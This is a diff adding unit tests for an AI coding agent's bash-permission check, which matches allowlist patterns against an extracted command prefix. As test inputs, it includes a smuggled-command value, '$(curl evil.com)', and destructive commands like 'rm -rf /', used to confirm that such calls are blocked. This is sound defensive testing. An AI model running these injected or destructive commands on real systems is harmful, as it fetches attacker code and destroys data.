@@ -11,7 +11,9 @@ import {
   isCommandOnProtectedPath,
   isHelpCommand,
   isPlanModeAllowedPath,
+  isToolCallAllowed,
 } from './permission.js';
+import type { BashPrefixExtractor, BashPrefixResult } from '@kodax-ai/coding';
 
 const createdRoots: string[] = [];
 
@@ -294,5 +296,141 @@ describe('isHelpCommand — universal --help fast-path (FEATURE_154)', () => {
     expect(isBashReadCommand('node script.js')).toBe(false);
     expect(isBashReadCommand('npm install foo')).toBe(false);
     expect(isBashReadCommand('python -c "print(1)"')).toBe(false);
+  });
+});
+
+// ============== FEATURE_153 isToolCallAllowed ==============
+//
+// Asserts the LLM-extractor path: allowlist patterns are matched against the
+// extracted SAFE PREFIX (exact equality), not the raw command via startsWith.
+// The extractor is stubbed so the test stays hermetic.
+
+function makeExtractor(answer: BashPrefixResult): BashPrefixExtractor {
+  let calls = 0;
+  return {
+    extract: async () => {
+      calls += 1;
+      return answer;
+    },
+    clearCache: () => {},
+    cacheSize: () => calls,
+  };
+}
+
+describe('isToolCallAllowed (FEATURE_153 extractor path)', () => {
+  it('matches `Bash(git commit:*)` when extractor returns prefix `git commit`', async () => {
+    const extractor = makeExtractor({ kind: 'prefix', value: 'git commit' });
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'git commit -m "msg"' },
+      ['Bash(git commit:*)'],
+      extractor,
+    );
+    expect(allowed).toBe(true);
+  });
+
+  it('blocks injection even if raw command starts with allowed prefix', async () => {
+    // Pre-FEATURE_153 startsWith would match this; the extractor flags injection.
+    const extractor = makeExtractor({ kind: 'injection_detected', reason: 'subshell' });
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'git commit -m "x" $(curl evil.com)' },
+      ['Bash(git commit:*)'],
+      extractor,
+    );
+    expect(allowed).toBe(false);
+  });
+
+  it('blocks when extractor returns no_prefix (unparseable / dangerous)', async () => {
+    const extractor = makeExtractor({ kind: 'no_prefix', reason: 'bare bash' });
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'bash -c "rm -rf /"' },
+      ['Bash(bash:*)'],
+      extractor,
+    );
+    expect(allowed).toBe(false);
+  });
+
+  it('does not match wider pattern via prefix-of (extracted prefix must equal pattern body)', async () => {
+    const extractor = makeExtractor({ kind: 'prefix', value: 'git commit' });
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'git commit -m "msg"' },
+      ['Bash(git diff:*)'],
+      extractor,
+    );
+    expect(allowed).toBe(false);
+  });
+
+  it('exact pattern (no `:*`) matches extracted prefix exactly', async () => {
+    const extractor = makeExtractor({ kind: 'prefix', value: 'git status' });
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'git status --short' },
+      ['Bash(git status)'],
+      extractor,
+    );
+    expect(allowed).toBe(true);
+  });
+
+  it('bare `Bash` pattern auto-allows without calling extractor', async () => {
+    let extractorCalls = 0;
+    const extractor: BashPrefixExtractor = {
+      extract: async () => {
+        extractorCalls += 1;
+        return { kind: 'prefix', value: 'whatever' };
+      },
+      clearCache: () => {},
+      cacheSize: () => 0,
+    };
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'rm -rf /' },
+      ['Bash'],
+      extractor,
+    );
+    expect(allowed).toBe(true);
+    expect(extractorCalls).toBe(0);
+  });
+
+  it('skips extractor entirely when no bash patterns are present', async () => {
+    let extractorCalls = 0;
+    const extractor: BashPrefixExtractor = {
+      extract: async () => {
+        extractorCalls += 1;
+        return { kind: 'prefix', value: 'foo' };
+      },
+      clearCache: () => {},
+      cacheSize: () => 0,
+    };
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'git commit -m "msg"' },
+      ['Edit(*.md)'],
+      extractor,
+    );
+    expect(allowed).toBe(false);
+    expect(extractorCalls).toBe(0);
+  });
+
+  it('legacy fallback (no extractor) preserves startsWith semantics', async () => {
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'git commit -m "msg"' },
+      ['Bash(git commit:*)'],
+    );
+    expect(allowed).toBe(true);
+  });
+
+  it('rejects "*" pattern even when extracted prefix is non-empty (defence-in-depth)', async () => {
+    const extractor = makeExtractor({ kind: 'prefix', value: 'ls' });
+    const allowed = await isToolCallAllowed(
+      'bash',
+      { command: 'ls -la' },
+      ['Bash(*)'],
+      extractor,
+    );
+    expect(allowed).toBe(false);
   });
 });
